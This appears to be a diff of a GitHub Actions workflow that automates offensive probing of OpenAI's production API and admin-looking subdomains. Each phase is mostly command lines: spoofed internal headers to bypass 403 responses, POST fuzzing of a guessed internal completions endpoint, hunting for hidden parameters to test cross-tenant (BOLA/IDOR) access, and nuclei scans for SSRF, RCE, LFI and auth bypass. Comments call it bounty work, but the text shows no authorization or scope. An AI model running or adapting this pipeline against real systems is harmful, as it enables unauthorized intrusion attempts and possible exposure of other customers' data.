@@ -11,55 +11,62 @@ jobs:
 
       - name: Install Advanced Arsenal
         run: |
-          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
-          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
           go install -v github.com/ffuf/ffuf/v2@latest
+          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
           pip install arjun
           sudo mv ~/go/bin/* /usr/local/bin/
 
-      - name: Phase 1:API Gateway Bypass Testing
+      - name: Phase 1:Authentication Bypass & Header Smuggling
         run: |
-          # Targeting the specific unified gateways and internal paths
-          echo "https://api.openai.com/v1/completionsinternal" > targets.txt
-          echo "https://admin.unified-8.api.openai.com" >> targets.txt
-          echo "https://higherlevelapi.unified-8.api.openai.com" >> targets.txt
+          # Targeting the specific 403/404 gateways you discovered
+          cat <<EOF > targets.txt
+          https://api.openai.com/v1/completionsinternal
+          https://admin.unified-8.api.openai.com
+          https://higherlevelapi.unified-8.api.openai.com
+          EOF
           
-          # HTTPX testing for 403 bypass using internal headers
-          httpx -l targets.txt -H "X-Forwarded-For: 127.0.0.1" -H "X-OpenAI-Internal: true" -H "X-Admin: true" -sc -title -o bypass_results.txt
+          # Testing for "Header Smuggling" which can trick a 403 into a 200
+          # We use X-OpenAI-Internal and X-Forwarded-For to simulate internal office traffic
+          httpx -l targets.txt \
+            -H "X-OpenAI-Internal: true" \
+            -H "X-Forwarded-For: 127.0.0.1" \
+            -H "X-Real-IP: 10.0.0.1" \
+            -H "X-Admin: true" \
+            -sc -title -o bypass_results.txt
 
-      - name: Phase 2:POST Verb & JSON Fuzzing (The "404" Killer)
+      - name: Phase 2:POST Verb Fuzzing (Killing the 404)
         run: |
-          # Fuzzing for the correct model name or internal parameter that triggers the API
-          # We use a POST request because internal completion APIs rarely support GET
+          # A 404 on an API often means "GET is not allowed, but POST might be"
+          # We fuzz the JSON body to see if we can trigger a 401 (Unauthorized) or 500 (Error)
+          # A 401 or 500 is a SUCCESS because it confirms the endpoint is functional
           ffuf -u "https://api.openai.com/v1/completionsinternal" -X POST \
-          -H "Content-Type: application/json" \
-          -d '{"model": "FUZZ", "prompt": "hi"}' \
-          -w /usr/share/dict/words -mc 200,401,403,500 -o api_fuzz_results.json || true
+            -H "Content-Type: application/json" \
+            -H "X-OpenAI-Internal: true" \
+            -d '{"model": "FUZZ", "prompt": "test_internal_access"}' \
+            -w /usr/share/dict/words -mc 200,401,403,500 -o api_fuzz_results.json || true
 
-      - name: Phase 3:Forced Parameter Discovery (BOLA/IDOR Hunt)
+      - name: Phase 3:BOLA/IDOR Parameter Discovery
         run: |
-          # Arjun is forced to use POST mode to find hidden organization/user parameters
-          arjun -u "https://api.openai.com/v1/completionsinternal" -m POST --rate-limit 2 -oJ "params_discovery.json" || true
-          
-          # Checking admin gateways for hidden 'debug' or 'internal' flags
-          arjun -u "https://admin.unified-8.api.openai.com" -m GET --rate-limit 2 -oJ "admin_params.json" || true
+          # Fuzzing for hidden parameters like 'organization_id' or 'user_id'
+          # If we find these, we can test for cross-tenant data access (BOLA)
+          arjun -u "https://api.openai.com/v1/completionsinternal" \
+            -m POST -H "Content-Type: application/json" \
+            --rate-limit 2 -oJ "bola_params.json" || true
 
-      - name: Phase 4:SSRF & RCE Nuclei Scan
+      - name: Phase 4:High-CVE Nuclei Scan (RCE & SSRF)
         run: |
-          # Specific templates for Out-of-Band (OOB) and Server Side Request Forgery
-          # If completionsinternal can reach an external server, it is a massive bounty
-          nuclei -l targets.txt -tags ssrf,oast,blind-idor,rce,lfi -severity critical,high -rl 5 -o nuclei_results.txt || true
+          # Focus only on the most critical CVEs for API gateways
+          # We use OAST (Out-of-band) testing to see if the server talks back to us
+          nuclei -l targets.txt -tags ssrf,rce,lfi,auth-bypass -severity critical,high -rl 5 -o nuclei_results.txt || true
 
       - name: Archive Critical Evidence
         uses: actions/upload-artifact@v4
         with:
-          name: openai-api-gold-results
+          name: openai-vulnerability-results
           path: |
             nuclei_results.txt
             api_fuzz_results.json
-            params_discovery.json
-            admin_params.json
+            bola_params.json
             bypass_results.txt
             
